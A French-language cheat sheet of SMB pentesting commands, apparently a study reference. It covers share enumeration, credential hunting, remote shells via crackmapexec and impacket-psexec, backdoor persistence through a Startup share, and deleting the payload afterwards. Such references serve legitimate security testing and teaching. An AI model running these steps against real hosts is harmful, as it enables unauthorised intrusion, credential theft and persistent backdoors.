# 📦 SMB - Cheatsheet Cybersécurité

Ce fichier contient les commandes essentielles pour **découvrir**, **énumérer**, **exploiter** et **maintenir un accès** via SMB (port 445).

---

## 🔍 1. Scan & Enumération

nmap -p 445 --script smb-os-discovery <IP>  
> Version de Windows / nom NetBIOS / domaine

nmap --script smb-enum-shares -p 445 <IP>  
> Enumère les partages accessibles

nmap --script smb-enum-users -p 445 <IP>  
> Enumère les utilisateurs du domaine (si possible)

smbclient -L //<IP>/ -N  
> Liste les partages anonymes (-N = pas d’authentification)

enum4linux-ng <IP>  
> Enumération complète (users, shares, policies...)

smbmap -H <IP>  
> Enumération rapide des partages + permissions

---

## 🔑 2. Connexion aux partages

smbclient //<IP>/partage -U <user>  
> Connexion avec un utilisateur

smbclient //<IP>/partage -N  
> Connexion anonyme

get <fichier>  
> Télécharger un fichier

put <fichier>  
> Envoyer un fichier

---

## 🧠 3. Recherche d'infos sensibles

cd / ls  
> Navigation dans les partages

recherche :  
- `backup/`, `config/`, `.git/`, `.ssh/`, `desktop.ini`, `.ps1`, `.bat`  
> Fichiers de config, scripts de démarrage, etc.

strings fichier.txt  
> Extrait les chaînes lisibles

grep -i password fichier.txt  
> Cherche des mots de passe dans les fichiers

---

## 🐚 4. Exploitation & shell

crackmapexec smb <IP> -u user -p pass  
> Test d’authentification et d'accès aux shares

crackmapexec smb <IP> --shares  
> Enumère les shares accessibles avec les creds

crackmapexec smb <IP> -u user -p pass --exec 'whoami'  
> Exécution de commande distante (si SMB signed)

impacket-psexec user:pass@<IP>  
> Shell distant si admin (équivalent à WinRM / PsExec)

impacket-smbclient <user>:<pass>@<IP>  
> Client interactif impacket

---

## 🔓 5. Vulnérabilités classiques

- SMBv1 activé  
- Partages accessibles en anonyme  
- Credentials en clair dans fichiers  
- Exécution de commandes à distance (si admin)  
- Relay NTLM (si SMB signing désactivé)

---

## 🛠 6. Outils SMB utiles

- `nmap`  
> Détection & scripts NSE SMB

- `enum4linux-ng`  
> Enumération avancée

- `smbmap`  
> Visualisation des droits utilisateurs

- `crackmapexec`  
> Exploitation complète (smb shares, exec, enum)

- `impacket`  
> Suite complète d’outils (smbclient, psexec, secretsdump...)

- `smbclient`  
> Client Samba CLI

---

## 🧬 7. Persistance

### 🛠 Upload de scripts ou backdoors

smbclient //<IP>/Startup -U user  
put backdoor.exe  
> Envoie un payload dans le dossier de démarrage

### 📅 Tâche planifiée (via smbexec / psexec)

impacket-psexec user:pass@IP  
> Peut créer une tâche planifiée persistante

---

## 🧹 8. Nettoyage

del backdoor.exe  
> Supprimer payload du partage

audit.log  
> Vérifier les logs de connexions

---

## 📚 9. Ressources utiles

- [HackTricks - SMB](https://book.hacktricks.xyz/network-services-pentesting/pentesting-smb)
- [PayloadsAllTheThings - SMB](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Methodology%20and%20Resources/Network%20Pivoting#smb)
- [Impacket Tools](https://github.com/fortra/impacket)
